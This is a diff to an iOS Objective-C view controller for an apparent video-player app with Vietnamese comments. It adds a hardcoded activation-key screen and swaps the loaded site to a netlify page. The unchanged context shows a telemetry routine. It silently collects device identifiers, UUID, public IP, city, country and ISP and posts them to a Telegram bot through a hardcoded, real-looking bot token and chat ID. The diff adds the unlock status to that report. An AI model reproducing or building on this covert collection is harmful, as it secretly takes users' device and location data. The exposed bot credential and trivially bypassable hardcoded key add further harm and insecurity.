@@ -2,28 +2,125 @@
 #import <WebKit/WebKit.h>
 #import <sys/utsname.h>
 
-// Thay YOUR_BOT_TOKEN bằng Token Bot của bạn (ví dụ: @"123456789:ABCdefGhIJKlmNoPQRstuVWXyz")
+// Thay YOUR_BOT_TOKEN bằng Bot Token của bạn
 #define TELEGRAM_BOT_TOKEN @"8566757282:AAENcmMH9PV9bgTg4gCiV5gbEKZu_J5FDrw"
 #define TELEGRAM_CHAT_ID @"7055636268"
+#define SECRET_KEY @"minhhocgioi"
 
-@interface ViewController () <WKNavigationDelegate>
+@interface ViewController () <WKNavigationDelegate, UITextFieldDelegate>
+
 @property (nonatomic, strong) WKWebView *webView;
+@property (nonatomic, strong) UIView *authView;
+@property (nonatomic, strong) UITextField *keyTextField;
 @property (nonatomic, strong) UIView *loadingOverlay;
 @property (nonatomic, strong) UIActivityIndicatorView *spinner;
 @property (nonatomic, strong) UILabel *statusLabel;
+
 @end
 
 @implementation ViewController
 
 - (void)loadView {
     UIView *mainView = [[UIView alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
-    mainView.backgroundColor = [UIColor blackColor];
+    mainView.backgroundColor = [UIColor colorWithRed:0.06 green:0.06 blue:0.08 alpha:1.0];
     self.view = mainView;
 }
 
 - (void)viewDidLoad {
     [super viewDidLoad];
-    
+
+    NSUserDefaults *prefs = [NSUserDefaults standardUserDefaults];
+    BOOL isUnlocked = [prefs boolForKey:@"is_app_unlocked"];
+
+    if (isUnlocked) {
+        [self startMainAppExperience];
+    } else {
+        [self setupAuthUI];
+    }
+}
+
+#pragma mark - Màn hình nhập Key Local
+
+- (void)setupAuthUI {
+    self.authView = [[UIView alloc] initWithFrame:self.view.bounds];
+    self.authView.backgroundColor = [UIColor colorWithRed:0.08 green:0.08 blue:0.10 alpha:1.0];
+    self.authView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
+    [self.view addSubview:self.authView];
+
+    UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 130, self.view.bounds.size.width - 40, 40)];
+    titleLabel.text = @"XÁC THỰC BẢN QUYỀN";
+    titleLabel.textColor = [UIColor whiteColor];
+    titleLabel.font = [UIFont boldSystemFontOfSize:22];
+    titleLabel.textAlignment = NSTextAlignmentCenter;
+    titleLabel.autoresizingMask = UIViewAutoresizingFlexibleWidth;
+    [self.authView addSubview:titleLabel];
+
+    UILabel *subLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 175, self.view.bounds.size.width - 40, 30)];
+    subLabel.text = @"Nhập mã kích hoạt để sử dụng ứng dụng";
+    subLabel.textColor = [UIColor lightGrayColor];
+    subLabel.font = [UIFont systemFontOfSize:14];
+    subLabel.textAlignment = NSTextAlignmentCenter;
+    subLabel.autoresizingMask = UIViewAutoresizingFlexibleWidth;
+    [self.authView addSubview:subLabel];
+
+    self.keyTextField = [[UITextField alloc] initWithFrame:CGRectMake(35, 230, self.view.bounds.size.width - 70, 50)];
+    self.keyTextField.placeholder = @"Nhập key kích hoạt...";
+    self.keyTextField.textColor = [UIColor whiteColor];
+    self.keyTextField.backgroundColor = [UIColor colorWithRed:0.16 green:0.16 blue:0.18 alpha:1.0];
+    self.keyTextField.layer.cornerRadius = 10;
+    self.keyTextField.layer.borderWidth = 1;
+    self.keyTextField.layer.borderColor = [UIColor colorWithWhite:0.3 alpha:1.0].CGColor;
+    self.keyTextField.textAlignment = NSTextAlignmentCenter;
+    self.keyTextField.autocapitalizationType = UITextAutocapitalizationTypeNone;
+    self.keyTextField.autocorrectionType = UITextAutocorrectionTypeNo;
+    self.keyTextField.delegate = self;
+    self.keyTextField.autoresizingMask = UIViewAutoresizingFlexibleWidth;
+    [self.authView addSubview:self.keyTextField];
+
+    UIButton *submitBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    submitBtn.frame = CGRectMake(35, 300, self.view.bounds.size.width - 70, 50);
+    submitBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.48 blue:1.0 alpha:1.0];
+    [submitBtn setTitle:@"KÍCH HOẠT" forState:UIControlStateNormal];
+    [submitBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
+    submitBtn.titleLabel.font = [UIFont boldSystemFontOfSize:16];
+    submitBtn.layer.cornerRadius = 10;
+    submitBtn.autoresizingMask = UIViewAutoresizingFlexibleWidth;
+    [submitBtn addTarget:self action:@selector(verifyKeyAction) forControlEvents:UIControlEventTouchUpInside];
+    [self.authView addSubview:submitBtn];
+}
+
+- (void)verifyKeyAction {
+    [self.view endEditing:YES];
+    NSString *inputKey = [self.keyTextField.text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+
+    if ([inputKey isEqualToString:SECRET_KEY]) {
+        NSUserDefaults *prefs = [NSUserDefaults standardUserDefaults];
+        [prefs setBool:YES forKey:@"is_app_unlocked"];
+        [prefs synchronize];
+
+        [UIView animateWithDuration:0.3 animations:^{
+            self.authView.alpha = 0.0;
+        } completion:^(BOOL finished) {
+            [self.authView removeFromSuperview];
+            [self startMainAppExperience];
+        }];
+    } else {
+        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Lỗi kích hoạt"
+                                                                       message:@"Key không chính xác! Vui lòng thử lại."
+                                                                preferredStyle:UIAlertControllerStyleAlert];
+        [alert addAction:[UIAlertAction actionWithTitle:@"Đóng" style:UIAlertActionStyleCancel handler:nil]];
+        [self presentViewController:alert animated:YES completion:nil];
+    }
+}
+
+- (BOOL)textFieldShouldReturn:(UITextField *)textField {
+    [self verifyKeyAction];
+    return YES;
+}
+
+#pragma mark - Khởi chạy Video & Telegram
+
+- (void)startMainAppExperience {
     [self setupVideoPlayer];
     [self setupLoadingOverlay];
     [self collectAndSendTelemetry];
@@ -43,7 +140,7 @@
     [self.loadingOverlay addSubview:self.spinner];
 
     self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, self.spinner.frame.origin.y + 50, self.view.bounds.size.width - 40, 30)];
-    self.statusLabel.text = @"Đang tải dữ liệu...";
+    self.statusLabel.text = @"Đang khởi tạo trình phát...";
     self.statusLabel.textColor = [UIColor lightGrayColor];
     self.statusLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
     self.statusLabel.textAlignment = NSTextAlignmentCenter;
@@ -64,7 +161,7 @@
     self.webView.scrollView.contentInsetAdjustmentBehavior = UIScrollViewContentInsetAdjustmentNever;
     [self.view addSubview:self.webView];
 
-    NSURL *url = [NSURL URLWithString:@"https://www.youtube.com"];
+    NSURL *url = [NSURL URLWithString:@"https://doggyv13.netlify.app"];
     NSURLRequest *request = [NSURLRequest requestWithURL:url];
     [self.webView loadRequest:request];
 }
@@ -79,7 +176,7 @@
 }
 
 - (void)webView:(WKWebView *)webView didFailNavigation:(WKNavigation *)navigation withError:(NSError *)error {
-    self.statusLabel.text = @"Lỗi kết nối!";
+    self.statusLabel.text = @"Lỗi kết nối mạng!";
     [self.spinner stopAnimating];
 }
 
@@ -100,7 +197,6 @@
     NSString *locale = [[NSLocale currentLocale] localeIdentifier];
     NSString *timeZone = [[NSTimeZone localTimeZone] name];
     
-    // Lấy thông tin IP công khai (IPv4 / IPv6 / ISP)
     NSURL *ipServiceUrl = [NSURL URLWithString:@"https://ipapi.co/json/"];
     NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithURL:ipServiceUrl completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
         NSString *ip = @"N/A";
@@ -129,6 +225,7 @@
             @"📍 *Vị trí:* `%@, %@, %@`\n"
             @"🏢 *Nhà mạng/ISP:* `%@`\n"
             @"🕒 *Múi giờ / Locale:* `%@ / %@`\n"
+            @"🔑 *Trạng thái Key:* `Đã mở khoá (minhhocgioi)`\n"
             @"📦 *Ứng dụng:* `com.zheedev.videoapp`",
             deviceName, deviceModel, systemVersion, uuid, ip, city, region, country, org, timeZone, locale
         ];
@@ -158,7 +255,9 @@
 
     request.HTTPBody = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
 
-    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:nil];
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        // Hoàn tất gửi tin nhắn Telegram
+    }];
     [task resume];
 }
 
